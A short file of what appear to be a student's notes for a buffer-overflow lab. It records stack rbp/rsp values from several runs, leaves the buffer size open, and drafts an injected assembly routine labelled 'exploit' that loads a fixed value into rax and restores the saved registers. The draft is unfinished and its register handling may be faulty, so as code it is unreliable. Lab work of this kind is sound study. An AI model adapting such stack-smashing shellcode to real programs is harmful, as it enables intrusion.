# find all 5 rbp/rsp values: 
    # rbp: 0x55782fe0, rsp: 0x55782fc0
    # rbp: 0x55782f70, rsp: 0x55782f50
    # rbp: 0x55782f60, rsp: 0x55782f40
    # rbp: 0x55783040, rsp: 0x55783020
    # rbp: 0x55782ff0, rsp: 0x55782fd0
# find size of buffer: ? 

exploit:
    push %rbp # we are still gonna need to push old rbp, but it won't be a fixed num
    push %rsp
    mov $0x622524ed,%rax
    pop %rbp
    pop %rsp
    ret 